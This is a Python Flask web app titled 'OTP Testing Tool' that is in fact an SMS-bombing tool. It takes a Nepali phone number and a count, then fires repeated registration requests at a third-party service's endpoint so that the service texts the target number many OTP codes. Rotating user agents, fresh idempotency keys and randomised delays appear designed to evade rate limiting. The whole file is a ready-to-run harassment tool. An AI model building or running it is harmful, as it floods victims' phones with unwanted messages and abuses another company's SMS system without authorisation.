#!/usr/bin/python3
# -*- coding: UTF-8 -*-

from flask import Flask, request
import json, logging, requests, re, time, random, uuid
from concurrent.futures import ThreadPoolExecutor, as_completed

app = Flask(__name__)

# Logging
logging.basicConfig(
    filename='otp_testing.log',
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

API_URL = "https://backend.clamphook.com/auth/register"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
]

# ---------- Core OTP Logic ----------
def validate_phone_number(phone_number):
    phone_number = phone_number.strip()
    if not re.match(r'^(98|97)\d{8}$', phone_number):
        raise ValueError("Invalid Nepal number. Must be 10 digits starting with 98 or 97.")
    return phone_number

def send_otp_request(phone_number, request_id):
    headers = {
        "Host": "backend.clamphook.com",
        "Origin": "https://backend.clamphook.com",
        "User-Agent": random.choice(USER_AGENTS),
        "Content-Type": "application/json",
        "Idempotency-Key": str(uuid.uuid4()),
    }
    payload = {"mobile": f"977-{phone_number}"}

    try:
        response = requests.post(API_URL, json=payload, headers=headers, timeout=15)
        if response.status_code == 200:
            try:
                response_json = response.json()
                if response_json.get("success", False) and response_json.get("operation") == "register_mobile":
                    return True
            except json.JSONDecodeError:
                pass
    except Exception as e:
        logging.error(f"Error: {e}")
    return False

def run_otp_tool(phone_number, num_otps):
    phone_number = validate_phone_number(phone_number)

    if num_otps <= 5:
        threads, delay = 1, 1.5
    elif num_otps <= 20:
        threads, delay = 2, 2.5
    else:
        threads, delay = 3, 3.5

    results, successes = [], 0

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for i in range(num_otps):
            futures.append(executor.submit(send_otp_request, phone_number, i+1))
            time.sleep(delay * random.uniform(0.8, 1.2))

        for i, future in enumerate(as_completed(futures), 1):
            result = future.result()
            if result:
                successes += 1
                results.append(f"[{i}/{num_otps}] ✅ Success")
            else:
                results.append(f"[{i}/{num_otps}] ❌ Failed")

    results.append(f"\nDone. {successes}/{num_otps} OTPs sent successfully.")
    return results

# ---------- Flask Routes ----------
@app.route("/", methods=["GET", "POST"])
def home():
    result_log = []
    if request.method == "POST":
        phone_number = request.form.get("phone")
        num_otps = int(request.form.get("count"))
        try:
            result_log = run_otp_tool(phone_number, num_otps)
        except Exception as e:
            result_log = [f"Error: {e}"]

    return f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>OTP Testing Tool</title>
        <style>
            body {{ font-family: Arial, sans-serif; text-align: center; margin: 40px; }}
            input, button {{ padding: 10px; margin: 10px; font-size: 16px; }}
            .log {{ margin-top: 20px; text-align: left; display: inline-block; white-space: pre-line; }}
        </style>
    </head>
    <body>
        <h1>OTP Testing Tool</h1>
        <form method="POST">
            <input type="text" name="phone" placeholder="98XXXXXXXX" required>
            <input type="number" name="count" min="1" max="50" placeholder="Count" required>
            <button type="submit">Send OTP</button>
        </form>

        {f'<div class="log"><h3>Results:</h3><pre>{"\\n".join(result_log)}</pre></div>' if result_log else ""}
    </body>
    </html>
    """
